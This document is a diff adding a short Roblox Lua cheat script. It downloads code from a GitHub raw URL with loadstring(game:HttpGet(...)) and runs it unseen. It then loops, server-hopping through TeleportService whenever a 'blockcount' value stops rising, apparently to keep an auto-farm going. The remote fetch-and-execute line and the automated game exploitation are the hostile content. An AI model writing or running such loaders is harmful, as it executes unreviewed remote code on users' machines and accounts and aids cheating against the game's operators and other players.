@@ -1,0 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalamalo/Shala/main/Shalihwam"))()
+spawn(function()
+    local previousBlockCount = 0
+    while true do
+        task.wait(60)
+        if blockcount and blockcount - previousBlockCount <= 0 then
+            repeat game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getServer().id, Player) task.wait(3) until not game.PlaceId
+        else
+            previousBlockCount = blockcount
+        end
+    end
+end)
